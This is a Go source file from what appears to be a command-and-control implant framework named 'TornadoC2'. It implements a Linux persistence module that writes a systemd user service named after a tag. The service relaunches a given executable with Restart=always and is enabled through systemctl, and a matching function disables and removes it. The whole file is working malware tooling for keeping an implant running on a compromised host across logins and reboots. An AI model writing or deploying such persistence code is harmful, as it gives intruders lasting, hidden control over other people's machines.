//go:build persist_systemd && linux

package core

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

func init() {
	persisters["systemd"] = persister{
		add: func(exe, tag string) (string, error) {
			if err := validTag(tag); err != nil {
				return "", err
			}
			dir := filepath.Join(profileDir(), ".config", "systemd", "user")
			if err := os.MkdirAll(dir, 0700); err != nil {
				return "", err
			}
			path := filepath.Join(dir, "tornado-"+tag+".service")
			body := fmt.Sprintf(`[Unit]
Description=TornadoC2 %s
[Service]
ExecStart=%s
Restart=always
RestartSec=10
[Install]
WantedBy=default.target
`, tag, exe)
			if err := os.WriteFile(path, []byte(body), 0600); err != nil {
				return "", err
			}
			_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
			_ = exec.Command("systemctl", "--user", "enable",
				"tornado-"+tag+".service").Run()
			return path, nil
		},
		del: func(tag string) error {
			path := filepath.Join(profileDir(), ".config", "systemd",
				"user", "tornado-"+tag+".service")
			_ = exec.Command("systemctl", "--user", "disable",
				"tornado-"+tag+".service").Run()
			_ = exec.Command("systemctl", "--user", "daemon-reload").Run()
			return os.Remove(path)
		},
	}
}
